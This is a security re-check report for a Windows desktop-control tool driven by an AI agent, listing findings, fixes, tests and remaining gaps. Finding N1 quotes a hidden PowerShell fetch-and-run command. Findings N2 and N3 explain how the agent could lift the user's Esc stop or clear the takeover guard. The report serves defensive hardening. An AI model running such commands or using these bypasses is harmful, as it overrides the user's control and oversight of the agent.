# Security re-check of v0.3.2 (HEAD 104cf34), 2026-11-09

Independent static re-check (Opus) of the v0.3.1 fixes. **Verdict: publish after fixes.** Fixed: H1, H2, H3, H5, H7, M1, M2, M4, M6. Partial: H4, H6, M3, M5, through the new items below. This file is the fix list for v0.3.3.

## Medium (all must be fixed)
- **N1. The Start-search fallback runs command lines (H6 bypass).**
  - Where: `apps.rs:335-344`. `classify` sends any text of 64 characters or less with no `\`, `/`, `://` or `scheme:` to Start search, so `open_app("powershell -nop -w hidden -c iwr x.y/z|iex")` minus the `/` gets typed into Start and Enter pressed.
  - Fix (director decision): **remove the typing fallback entirely.** When no installed app matches, return an error that lists the closest installed-app names and tells the model to ask the user. No Win key, no typing into Start.
- **N2. The agent can still lift the Esc stop.**
  - Where: `main.rs:44`, `session.rs:49-60`, `hooks.rs:97-129`, `guards.rs:13-15`. The agent's own shell can run `desktop-control.exe turn-ended` or touch the file, or simply wait 30 s, and `STOP_MESSAGE` tells it so.
  - Fix: the stop lifts only when (turn-ended touched after the stop **or** 30 s quiet) **and** a physical, non-injected user key or click has been seen after the stop (hook-flagged, `LLKHF_INJECTED`/`LLMHF_INJECTED` clear).
    - Ignore the Esc press and release that triggered the stop: require input at least ~300 ms after it, excluding that Esc's key-up.
    - Typing the next prompt in the AI app counts as user input.
    - Remove the 30 s and turn-ended hints from `STOP_MESSAGE` and `instructions.txt`. Say: "the user stopped you; call finish, explain, and wait for the user".
- **N3. `run_script` gets around the takeover guard.**
  - Where: `script.rs:275-290`, `tools.rs:267, 318`. Takeover refusals are catchable Rhai errors, and a `screenshot()` inside the script clears the takeover.
  - Fix:
    - Make the takeover terminal inside a script, ending the run the same way the stop does.
    - Only top-level `screenshot` / `list_elements` tool calls may clear a takeover; script-internal ones must not.
- **N4. The per-line clipboard restore can paste the user's own clipboard.**
  - Where: `input.rs` paste_lines, `actions.rs` settle. When the field can't be read, the restore comes about 250 ms after Ctrl+V, so a busy app may paste the user's clipboard.
  - Fix:
    - Restore per line only once the field visibly changed.
    - Otherwise wait until the target is idle (`SendMessageTimeout WM_NULL`, bounded) and restore once at the end.
    - Or type unreadable fields as keystrokes. Choose whichever is reliable, and test with a deliberately slow target.

## Low (fix in v0.3.3 as well)
- **L1. Masking fails open where acting fails closed.** `mask_protected` blacks out only LOCKED/FORBIDDEN exes. Also mask windows whose exe is unknown (`""`) and frame-host windows whose CoreWindow can't be found.
- **L2. Forbidden titles leak.**
  - Where: `check_exe` errors quote the title; `wait_for(scope=window)` returns raw titles (`actions.rs:274, 286`); the observe text includes "Active window now".
  - Fix: redact titles of FORBIDDEN/LOCKED windows everywhere in the output, and skip those windows in `match_window` for waits.
- **L3. The resolved path isn't re-checked.** Run `refusal()` and the `.exe` check on the canonical path (and on the target `find_app` resolves) before `ShellExecute`.
- **L4. Element process not checked.** In `resolve` and `locate_named`, run `check_exe` on the element's own process id, not only its root window.

## Publish-tree items
- `BUILD.md:9-12`: replace the personal paths with generic instructions (rustup default, or `RUSTUP_HOME`/`CARGO_HOME` as an example).
- README: use `desktop-control.exe` everywhere (MCP config, bench, Stop hook) until v1.0 renames it. Remove the `VERIFY` HTML comments after checking each claim against the code; drop or correct any claim that isn't true.
- `docs/SECURITY-REVIEW-0.3.1.md`: amend its status section to point to this file for H4/H6/M3/M5.
- The development history is not part of the published repository, which starts from a single commit; nothing to do in this round.

## Status in v0.3.3

Every item above is fixed in v0.3.3 (version bumped in `Cargo.toml` and `Cargo.lock`). "Runtime" = exercised by a test that runs the real exe against windows the test created itself; "debug build" = the same code, run through test triggers that only exist in a debug build (`cfg(debug_assertions)`); "code-only" = reviewed and unit-tested but not exercised end to end. Regression tests are in `tests/security_test.py` (sections n1, n2, n3, n4, l2, l3, l4, l1l2d) and the unit tests in `src/` (`apps.rs`, `hooks.rs`, `script.rs`). Where it was practical, each runtime test was also run against the v0.3.2 exe: N4, L2 and L4 fail there and pass here.

- **N1 (runtime, release exe).** The typing fallback is gone: `Launch::StartSearch`, the Win-key press, the Start-in-front check and `input::type_unicode` are deleted. A name that is no installed app returns an error that says nothing was opened or typed and lists the five closest installed names (never a forbidden app's), plus the instruction to ask the user. Test: a command-line-like name without `/`, `\` or `://` and two other unknown names; the window in front, the set of top-level windows and a canary text box are unchanged and no Start/Search program came to the front; with `apps.allowed` set the same error appears. Unit tests cover the ranking and the message.
- **N2 (debug build + unit tests; the physical path is code-only).** The stop lifts only when (turn-ended touched after it, or 30 s since the stop or the last call) AND a physical key press or click was seen after it (`LLKHF_INJECTED` / `LLMHF_INJECTED` clear). Not counted: mouse movement and the wheel, key releases, Esc itself (so a held Esc cannot count), and anything within 300 ms of the stop. `STOP_MESSAGE`, `finish`, `status` and `instructions.txt` no longer say how it lifts. Runtime checks: finish does not lift it; the agent running `turn-ended` does not lift it; three injected F24 key presses (which the hooks see with the injected flag) plus turn-ended do not lift it; a simulated key within the grace period does not count; a simulated key after it plus turn-ended lifts it; 31 s of quiet without a key leaves it stopped; 31 s of quiet followed by a simulated key lifts it with no tool call. The "physical key" in these tests is a debug trigger that calls `hooks::physical_input`, the function the real hook callbacks call; a real physical Esc, key or click cannot be produced by a script (it would carry the injected flag), so the wiring from the hook callbacks to that function is verified by reading the code only. Touch-only input may not reach the low-level mouse hook.
- **N3 (debug build for the user-touch trigger).** The takeover is terminal inside a script: the first refusal records a fatal error, every later action returns it and the engine is terminated at the next operation, so `try { } catch { }` cannot continue (the run ends as an error, the way the stop does). `screenshot()` and `list_elements()` inside a script no longer acknowledge; the acknowledgement moved into the top-level `screenshot` and `list_elements` tool calls, so the picture an action returns afterwards no longer clears a takeover either (a touch during an action is now remembered). Runtime: after a simulated touch, a script with try/catch around a click, a screenshot and a second click ends as a takeover error with nothing after the refusal run and the button not clicked; a second script that starts with `screenshot()` or `list_elements()` still cannot click; a top-level `list_elements` tool call clears it.
- **N4 (runtime, release exe).** Per line the clipboard goes back only once the field visibly changed. Otherwise (field unreadable, or no change within 1 s) the paste counts as unconfirmed: it waits until the foreground window answers `WM_NULL` promptly three times in a row (60 ms apart, bounded to 12 s for a whole typing; once that budget is spent, later lines are pasted without waiting), and the user's clipboard is restored once, at the end (and on every error exit). Test target: a WinForms custom control that UI Automation cannot read and whose Ctrl+V handler is busy for 2.5 s before it reads the clipboard. v0.3.2 pasted the user's own clipboard ("second line|USER-CLIP-SENTINEL", the first line lost); v0.3.3 delivers "first line|second line" and the clipboard is back afterwards. Not tested: a target that stays busy for more than 12 s (the clipboard is then put back anyway and the result says so), and a target that pastes from a timer after it has gone idle (the idle check cannot see that).
- **L1 (debug build).** `mask_protected` also blacks out a visible, titled, non-tool, non-cloaked window whose program is unknown (`""`) and a Store-app frame whose CoreWindow can't be found (invisible helper windows are left alone, otherwise one transparent unidentifiable overlay would black out the whole screen). Runtime check with a window made "unidentifiable" by a debug-only environment variable: it is blacked out of a monitor picture while an ordinary window next to it is still read by OCR. The frame-host-without-CoreWindow branch is code-only. Users will notice that a window of an elevated program can look black in monitor screenshots.
- **L2 (runtime, release exe; unknown program on the debug build).** Window titles now go through `win::shown_title` / `active_title`, which print "(hidden: protected window)" for a forbidden, locked or unidentifiable program; `check_exe` no longer quotes a title; waits skip such windows (`match_visible_window`); `list_apps` hides the title of an unidentifiable program too. Test: a forbidden-exe stand-in with a distinctive title, in front and in the background, through focus_window, screenshot, move_window, wait_for (tool and script), run_actions, type_text, click, press_keys, status, list_elements and `active_window()`: the title appears in none of them (v0.3.2: 13 checks failed).
- **L3 (unit tests + runtime refusals; the link case is code-only).** `apps::check_resolved_exe` (name rules on the canonical path, `.exe` required, allowed folder, program policy) runs in `classify` and again right before `ShellExecute`; an installed app whose id is an absolute path gets the same checks on the real file. Runtime: a path that reaches an exe outside the allowed folders through `..` is refused, and so is a symlink in a temp folder. Not covered at runtime: a link named `x.exe` inside Program Files that leads to a script (it needs write access there); the unit tests cover the check itself.
- **L4 (runtime, release exe).** `resolve` (by id) and `locate_named` (by name) check the element's own process (`CurrentProcessId`) with `check_exe`, in addition to its root window. Test: a forbidden-exe window made a child window of an ordinary window; `element_action(invoke)`, `read_text(name)` and `set_value` on its button are refused (v0.3.2 invoked the button, read it and typed into it). With `apps.allowed` set, controls hosted by a helper process (an embedded web view in its own process) are refused unless that program is allowed too.
- **Publish tree.** `BUILD.md` has generic toolchain instructions (no personal paths). The README uses `desktop-control.exe` everywhere except the rename notes. The five `VERIFY` comments are removed after checking: the 22 tools in the README table equal `tools/list` of the build (checked by a script), `observe`, `size` and `background` exist, the protocol versions and the exclusion of the indicator from capture are in the code, the sizes and timings match `bench`, and the `run_script` numbers were added from `bench/RESULTS.md`. The admin helper does not exist, so its bullet was dropped from the safety list (it stays in the roadmap); the client list was reworded to "any MCP client, tested daily with Claude Code"; the Esc-stop text follows N2. `SECURITY-REVIEW-0.3.1.md` points here for H4/H6/M3/M5. The git history is for the fresh single-commit repo and was not touched.

Test results for the final release build (the deployed copy, SHA-256 starting b929d50d): `cargo test` 22 passed; `cargo audit` no vulnerabilities (83 crates) and one existing warning (smartstring unmaintained, RUSTSEC-2026-0249, pulled in by `rhai`); `security_test.py` in six chunks (the debug sections against a debug build), all ok; `mcp_stdio_test` 53 ok, `client_style_test` 47, `match_test` 11, `e2e_stdio` ok, `background_test` 12, `ocr_script_test` 56, `cursor_test` 14, `keys_script_test` 9, `host_guard_test` 85, `home_test` 59, `completion_test` 18; `pointer_test` 8 ok and 5 failures in its "negative control" (the test expects Windows to hide the pointer after key presses with the wake disabled; in this session the pointer stays visible, and v0.3.2 fails the same checks, so it is the machine and not the change). ## Known limitations after v0.3.3 (independent re-check, planned for v0.3.4)

The re-check of v0.3.3 found every item above fixed and nothing blocking. Residual gaps:

- **Esc go-ahead from any window (Medium).** An agent that touches the turn-ended file itself, right after the stop, gets the stop lifted by the user's next key or click anywhere, for example a click into another app. Plan: count only input made while the AI app's window is in front, and only after the turn-ended touch.
- **Very long `open_app` names (Low).** The closest-name search runs on any length; refuse names over 260 characters first.
- **Idle wait ignores Esc and cancellation (Low).** While waiting for a busy, unreadable field (at most 12 s), a stop or cancel is answered late. Nothing is typed during the wait.
- **Idle probe target (Low).** The probe asks the foreground window; also probe the focused control's window when it belongs to another thread.
- **Title oracle (Low).** `focus_window` / `move_window` matching can confirm a protected window's title substring through the refusal text; waits can confirm that an unknown program's window exists.
- **Embedded protected child windows (Low).** A forbidden program's window embedded as a child of an ordinary window is refused for acting, but still visible in screenshots and readable as a whole-window listing.
